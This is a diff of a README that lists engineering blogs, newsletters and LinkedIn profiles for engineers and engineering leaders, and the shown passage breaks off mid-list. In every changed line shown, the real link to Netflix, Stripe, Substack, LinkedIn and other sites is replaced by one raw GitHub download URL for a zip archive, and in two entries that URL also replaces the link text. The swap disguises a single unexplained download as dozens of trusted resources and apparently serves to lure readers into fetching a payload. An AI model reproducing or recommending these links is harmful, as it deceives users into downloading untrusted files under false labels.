@@ -31,50 +31,50 @@ Important: Before you choose which resources you wish to go more in detail, I su
 
 **List of blogs**
 
-- [Meta Engineering](https://engineering.fb.com/)
-- [AWS Architecture](https://aws.amazon.com/blogs/architecture/)
-- [The Netflix Tech](https://netflixtechblog.com/)
-- [Apple Security Tech](https://security.apple.com/blog/)
-- [Google AI/Research](https://blog.research.google/)
-- [LinkedIn Engineering](https://engineering.linkedin.com/blog)
-- [Uber Engineering](https://eng.uber.com/)
-- [Engineering at Quora](https://quoraengineering.quora.com/)
-- [Pinterest Engineering](https://medium.com/pinterest-engineering)
-- [Lyft Engineering](https://eng.lyft.com/)
-- [Twitter Engineering](https://blog.twitter.com/engineering)
-- [Dropbox Engineering](https://dropbox.tech/)
-- [Spotify Engineering](https://engineering.atspotify.com/)
-- [Github Engineering](https://github.blog/category/engineering/)
-- [Instagram Engineering](https://instagram-engineering.com/)
-- [Canva Engineering](https://canvatechblog.com/)
-- [Booking.com Tech](https://blog.booking.com/)
-- [The Airbnb Tech](https://medium.com/airbnb-engineering)
-- [Stripe Engineering](https://stripe.com/blog/engineering)
-- [Discord Engineering and Design](https://discord.com/blog)
-- [Engineering at Microsoft](https://devblogs.microsoft.com/engineering-at-microsoft/)
-- [Reddit Engineering](https://www.reddit.com/r/RedditEng/)
-- [Slack Engineering](https://slack.engineering/)
-- [Asana](https://blog.asana.com/category/eng/)
-- [DigitalOcean](https://www.digitalocean.com/blog/tag/engineering)
-- [CloudFlare](https://blog.cloudflare.com/)
-- [HelloInterview](https://www.hellointerview.com/learn/system-design)
+- [Meta Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [AWS Architecture](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [The Netflix Tech](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Apple Security Tech](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Google AI/Research](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [LinkedIn Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Uber Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Engineering at Quora](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Pinterest Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Lyft Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Twitter Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Dropbox Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Spotify Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Github Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Instagram Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Canva Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip Tech](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [The Airbnb Tech](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Stripe Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Discord Engineering and Design](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Engineering at Microsoft](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Reddit Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Slack Engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Asana](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [DigitalOcean](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [CloudFlare](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [HelloInterview](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
 
 **List of newsletters**
 
-- [System Design Newsletter](https://newsletter.systemdesign.one/) by Neo Kim
-- [Byte-Sized Design](https://bytesizeddesign.substack.com/) by Alex Nguyen
-- [ByteByteGo](https://blog.bytebytego.com/) by Alex Xu
-- [System Design Codex](https://newsletter.systemdesigncodex.com/) by Saurabh Dashora
-- [Hacking Scale](https://newsletter.betterstack.com/) by Richard Oliver Bray
+- [System Design Newsletter](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Neo Kim
+- [Byte-Sized Design](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Alex Nguyen
+- [ByteByteGo](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Alex Xu
+- [System Design Codex](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Saurabh Dashora
+- [Hacking Scale](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Richard Oliver Bray
 
 **People to follow on LinkedIn**
 
-- [Neo Kim](https://www.linkedin.com/in/nk-systemdesign-one/)
-- [Alex Nguyen](https://www.linkedin.com/in/alexcancode/)
-- [Alex Xu](https://www.linkedin.com/in/alexxubyte/)
-- [Raul Junco](https://www.linkedin.com/in/raul-junco/)
-- [Saurabh Dashora](https://www.linkedin.com/in/saurabh-dashora/)
-- [Evan King](https://www.linkedin.com/in/evan-king-40072280/)
+- [Neo Kim](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Alex Nguyen](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Alex Xu](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Raul Junco](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Saurabh Dashora](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Evan King](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
 
 ## Become a better Leader / Manager
 
@@ -96,55 +96,55 @@ Important: Before you choose which resources you wish to go more in detail, I su
 
 **List of newsletters**
 
-- [Engineering Leadership](https://newsletter.eng-leadership.com/) by Gregor Ojstersek
-- [The Caring Techie Newsletter](https://www.thecaringtechie.com/) by Irina Stanescu
-- [Elevate](https://addyo.substack.com/) by Addy Osmani
-- [Leading Developers](https://zaidesanton.substack.com/) by Anton Zaides
-- [The Hybrid Hacker](https://hybridhacker.email/) by Nicola Ballotta
-- [Tech World With Milan Newsletter](https://newsletter.techworld-with-milan.com/) by Dr Milan Milanovic
-- [The Engineering Manager](https://theengineeringmanager.substack.com/?utm_source=recommendations_page&utm_campaign=1115815) by James Stanier
-- [Techlead Mentor](https://newsletter.techleadmentor.com/) by Raviraj Achar
-- [Developing Skills](https://developingskills.substack.com/) by John Crickett
-- [Refactoring](https://refactoring.fm/) by Luca Rossi
-- [Level up as a Tech Lead](https://anemarifiser.substack.com/) by Anemari Fiser
-- [Code.Lead.Succeed](https://darsadowski.substack.com/) by Dariusz Sadowski
-- [snackableCTO](https://blog.snackablecto.coach/) by Adrian Stanek
-- [Crafting Tech Teams](https://craftingtechteams.substack.com/) by Denis Čahuk
-- [The Software Engineering Times](https://thesoftwareengineeringtimes.substack.com/) by Ryan Murphy
-- [The Visionary CTO](https://blog.visionarycto.com/) by Matt Watson
-- [Alex Ewerlöf Notes](https://blog.alexewerlof.com/) by Alex Ewerlöf
-- [Sudo Make Me a CTO](https://makemeacto.substack.com/) by Sergio Visinoni
-- [Programming Leadership - Marcus Blankenship](https://marcusblankenship.substack.com/) by Marcus Blankenship
-- [Leadership Superpowers](https://gplead.com/newsletter) by Gregor Purdy
+- [Engineering Leadership](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Gregor Ojstersek
+- [The Caring Techie Newsletter](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Irina Stanescu
+- [Elevate](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Addy Osmani
+- [Leading Developers](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Anton Zaides
+- [The Hybrid Hacker](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Nicola Ballotta
+- [Tech World With Milan Newsletter](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Dr Milan Milanovic
+- [The Engineering Manager](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by James Stanier
+- [Techlead Mentor](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Raviraj Achar
+- [Developing Skills](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by John Crickett
+- [Refactoring](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Luca Rossi
+- [Level up as a Tech Lead](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Anemari Fiser
+- [https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Dariusz Sadowski
+- [snackableCTO](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Adrian Stanek
+- [Crafting Tech Teams](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Denis Čahuk
+- [The Software Engineering Times](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Ryan Murphy
+- [The Visionary CTO](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Matt Watson
+- [Alex Ewerlöf Notes](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Alex Ewerlöf
+- [Sudo Make Me a CTO](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Sergio Visinoni
+- [Programming Leadership - Marcus Blankenship](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Marcus Blankenship
+- [Leadership Superpowers](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Gregor Purdy
 
 **People to follow on LinkedIn**
 
-- [Gregor Ojstersek](https://www.linkedin.com/in/gregorojstersek/)
-- [Omar Halabieh](https://www.linkedin.com/in/omarhalabieh/)
-- [Nicola Ballotta](https://www.linkedin.com/in/nicolaballotta/)
-- [Irina Stanescu](https://www.linkedin.com/in/irinastanescu/)
-- [Luca Rossi](https://www.linkedin.com/in/lucaronin/)
-- [Addy Osmani](https://www.linkedin.com/in/addyosmani/)
-- [Anton Zaides](https://www.linkedin.com/in/anton-zaides/)
-- [Dr Milan Milanović](https://www.linkedin.com/in/milanmilanovic/)
-- [Anemari Fiser](https://www.linkedin.com/in/anemari-fiser/)
-- [Raviraj Achar](https://www.linkedin.com/in/ravirajachar/)
-- [Dariusz Sadowski](https://www.linkedin.com/in/darsadowski/)
-- [Adrian Stanek](https://www.linkedin.com/in/adrianstanek/)
-- [Denis Čahuk](https://www.linkedin.com/in/deniscahuk/)
-- [Matt Watson](https://www.linkedin.com/in/mattwatsonkc/overlay/about-this-profile/)
-- [Ryan Murphy](https://www.linkedin.com/in/ryansmurphy1/)
-- [Kahlil Lechelt](https://www.linkedin.com/in/kahlillechelt/)
-- [James Stanier](https://www.linkedin.com/in/jstanier/)
-- [Alex Ewerlöf](https://www.linkedin.com/in/alexewerlof/)
-- [Itzy Sabo](https://www.linkedin.com/in/itzysabo/)
-- [Daria Rudnik](https://www.linkedin.com/in/dariarudnik/)
-- [Tobias Mende](https://www.linkedin.com/in/tobiasmende/)
-- [Luca Sartoni](https://www.linkedin.com/in/lucasartoni/)
-- [Doug Howard, P.E.](https://www.linkedin.com/in/doughowardcoaching/)
-- [Anco van der Wurff](https://www.linkedin.com/in/ancowurff/)
-- [Sergio Visinoni](https://www.linkedin.com/in/piffio/)
-- [Gregor Purdy](https://www.linkedin.com/in/gregorpurdy/)
+- [Gregor Ojstersek](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Omar Halabieh](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Nicola Ballotta](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Irina Stanescu](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Luca Rossi](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Addy Osmani](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Anton Zaides](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Dr Milan Milanović](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Anemari Fiser](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Raviraj Achar](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Dariusz Sadowski](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Adrian Stanek](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Denis Čahuk](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Matt Watson](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Ryan Murphy](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Kahlil Lechelt](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [James Stanier](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Alex Ewerlöf](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Itzy Sabo](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Daria Rudnik](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Tobias Mende](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Luca Sartoni](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Doug Howard, P.E.](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Anco van der Wurff](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Sergio Visinoni](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Gregor Purdy](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
 
 ## Become a better Software Engineer
 
@@ -167,56 +167,56 @@ Important: Before you choose which resources you wish to go more in detail, I su
 
 **List of newsletters**
 
-- [Coding Challenges](https://codingchallenges.substack.com/) by John Crickett
-- [Developing Skills](https://developingskills.substack.com/) by John Crickett
-- [High Growth Engineer](https://careercutler.substack.com/) by Jordan Cutler
-- [The Developing Dev](https://www.developing.dev/) by Ryan Peterman
-- [Level up software engineering](https://levelupsoftwareengineering.substack.com/) by Caleb Mellas
-- [Engineer’s Codex](https://read.engineerscodex.com/) by Leonardo Creed
-- [The Modern Software Developer](https://tmsd.substack.com/) by Richard Donovan
-- [Strategize Your Career](https://strategizeyourcareer.substack.com/) by Fran Soto
-- [The Pragmatic Engineer](https://newsletter.pragmaticengineer.com/) by Gergely Orosz
-- [Software Design: Tidy First?](https://tidyfirst.substack.com/) by Kent Beck
-- [Dev Details](https://blog.devdetails.com/) by Mike Thornton
-- [Front-End Focus](https://frontendfocus.substack.com/) by Mads Brodt
-- [Craft Better Software](https://craftbettersoftware.com/) by Daniel Moka
-- [Saiyan Growth Letter](https://www.saiyangrowthletter.com/) by Tiger Abrodi
-- [The T-Shaped Dev](https://thetshaped.dev/) by Petar Ivanov
-- [The Polymathic Engineer](https://newsletter.francofernando.com/) by Franco Fernando
-- [ByteSizedBets](https://bytesizedbets.com/) by Ankur Tyagi
-- [Hungry Minds 🍔🧠](https://hungryminds.dev) by Alexandre Zajac
-- [Maximiliano Contieri - Software Design](https://maximilianocontieri.com/newsletter) by Maximiliano Contieri
-- [Path to Staff](https://pathtostaff.substack.com/) by Sidwyn Koh
-- [Marko Denic Tech](https://markodenic.tech) by Marko Denic
+- [Coding Challenges](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by John Crickett
+- [Developing Skills](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by John Crickett
+- [High Growth Engineer](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Jordan Cutler
+- [The Developing Dev](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Ryan Peterman
+- [Level up software engineering](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Caleb Mellas
+- [Engineer’s Codex](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Leonardo Creed
+- [The Modern Software Developer](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Richard Donovan
+- [Strategize Your Career](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Fran Soto
+- [The Pragmatic Engineer](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Gergely Orosz
+- [Software Design: Tidy First?](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Kent Beck
+- [Dev Details](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Mike Thornton
+- [Front-End Focus](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Mads Brodt
+- [Craft Better Software](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Daniel Moka
+- [Saiyan Growth Letter](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Tiger Abrodi
+- [The T-Shaped Dev](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Petar Ivanov
+- [The Polymathic Engineer](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Franco Fernando
+- [ByteSizedBets](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Ankur Tyagi
+- [Hungry Minds 🍔🧠](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Alexandre Zajac
+- [Maximiliano Contieri - Software Design](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Maximiliano Contieri
+- [Path to Staff](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Sidwyn Koh
+- [Marko Denic Tech](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Marko Denic
 
 **People to follow on LinkedIn**
 
-- [John Crickett](https://www.linkedin.com/in/johncrickett/)
-- [Jordan Cutler](https://www.linkedin.com/in/jordancutler1/)
-- [Ryan Peterman](https://www.linkedin.com/in/ryanlpeterman/)
-- [Caleb Mellas](https://www.linkedin.com/in/calebmellas/)
-- [Richard Donovan](https://www.linkedin.com/in/rich-donovan/)
-- [Daniel Moka](https://www.linkedin.com/in/danielmoka/)
-- [Tiger Abrodi](https://www.linkedin.com/in/tiger-abrodi/)
-- [Francisco Manuel (Fran) Soto Ramírez](https://www.linkedin.com/in/fransotodev/)
-- [Guille Ojeda](https://www.linkedin.com/in/guilleojeda/)
-- [Gergely Orosz](https://www.linkedin.com/in/gergelyorosz/)
-- [Kent Beck](https://www.linkedin.com/in/kentbeck/)
-- [Mike Thornton](https://www.linkedin.com/in/devdetails/)
-- [Mads Brodt](https://www.linkedin.com/in/madsbrodt/)
-- [Roman Frolov](https://www.linkedin.com/in/romfrolov/)
-- [Petar Ivanov](https://www.linkedin.com/in/petarivanovv9/)
-- [Fernando Franco](https://www.linkedin.com/in/fernando-franco-4696708/)
-- [Ankur Tyagi](https://www.linkedin.com/in/theankurtyagi/overlay/about-this-profile/)
+- [John Crickett](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Jordan Cutler](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Ryan Peterman](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
